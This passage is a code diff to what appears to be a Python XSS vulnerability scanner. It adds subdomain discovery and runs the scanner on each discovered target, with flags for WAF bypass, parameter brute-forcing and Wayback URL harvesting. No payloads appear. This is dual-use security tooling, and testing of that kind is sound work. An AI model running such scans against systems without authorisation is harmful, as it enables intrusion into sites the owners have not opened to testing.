         print(f"\n{Fore.RED}[!] Error: Domain is required for scanning{Style.RESET_ALL}")
         sys.exit(1)
+
+    # Multi-Target Scanning Logic
+    targets_to_scan = []
     
-    # Create and run scanner
-    scanner = XSSScanner(
-        target=args.domain,
-        max_depth=args.depth,
-        timeout=args.timeout,
-        verbose=args.verbose,
-        custom_payloads=custom_payloads,
-        first_only=not args.all_payloads,  # Stop at first match unless --all-payloads
-        waf_bypass=args.waf_bypass,  # Enable WAF bypass mode
-        param_discovery=not args.no_param_discovery,  # Enable advanced parameter discovery (default: True)
-        brute_params=args.brute_params and not args.no_brute_params,  # Enable parameter brute-forcing (default: True)
-        force_test=args.force_test and not args.no_force_test,  # Force test common params when none discovered (default: True)
-        deep_scan=args.deep_scan  # Enable deep scanning
-    )
-    
-    try:
+    # Subdomain Discovery
+    if args.find_subdomains:
+        scanner = SubdomainScanner(args.domain, args.subdomain_wordlist)
         scanner.run()
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
-        if scanner.vulnerabilities:
-            scanner.print_results()
-        sys.exit(0)
+        if scanner.found_subdomains:
+            # Add all found subdomains to the scan list
+            targets_to_scan.extend(list(scanner.found_subdomains))
+        
+        print(f"\n{Fore.CYAN}[*] Continuing to XSS scan on discovered targets...{Style.RESET_ALL}")
+    
+    # Always add the main target (normalized already inside XSSScanner, but added here for list)
+    # Ensure it's not a duplicate if it was found in subdomains
+    if args.domain not in targets_to_scan:
+        targets_to_scan.insert(0, args.domain)
+        
+    # Remove duplicates
+    targets_to_scan = list_unique(targets_to_scan)
+    
+    total_targets = len(targets_to_scan)
+    print(f"\n{Fore.CYAN}[+] Scheduled {total_targets} target(s) for XSS scanning.{Style.RESET_ALL}")
+    
+    for i, target in enumerate(targets_to_scan, 1):
+        print(f"\n{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}   🚀 SCANNING TARGET [{i}/{total_targets}]: {Fore.WHITE}{target}{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}\n")
+    
+        # Create and run scanner for each target
+        scanner = XSSScanner(
+            target=target,
+            max_depth=args.depth,
+            timeout=args.timeout,
+            verbose=args.verbose,
+            custom_payloads=custom_payloads,
+            first_only=not args.all_payloads,  # Stop at first match unless --all-payloads
+            waf_bypass=args.waf_bypass,  # Enable WAF bypass mode
+            param_discovery=not args.no_param_discovery,  # Enable advanced parameter discovery (default: True)
+            brute_params=args.brute_params and not args.no_brute_params,  # Enable parameter brute-forcing (default: True)
+            force_test=args.force_test and not args.no_force_test,  # Force test common params when none discovered (default: True)
+            deep_scan=args.deep_scan,  # Enable deep scanning
+            wayback_limit=args.wayback_limit  # Limit for Wayback URLs ('all' or int)
+        )
+        
+        try:
+            scanner.run()
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user for target: {target}{Style.RESET_ALL}")
+            if scanner.vulnerabilities:
+                scanner.print_results()
+            
+            # Ask if user wants to stop everything or continue to next target
+            # For automation, maybe just break? But user might want to skip one.
+            # Let's assume full stop on Ctrl+C for safety.
+            sys.exit(0)
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error scanning {target}: {e}{Style.RESET_ALL}")
+            continue
+
+def list_unique(seq):
+    seen = set()
+    return [x for x in seq if not (x in seen or seen.add(x))]
+
 
 
 if __name__ == '__main__':
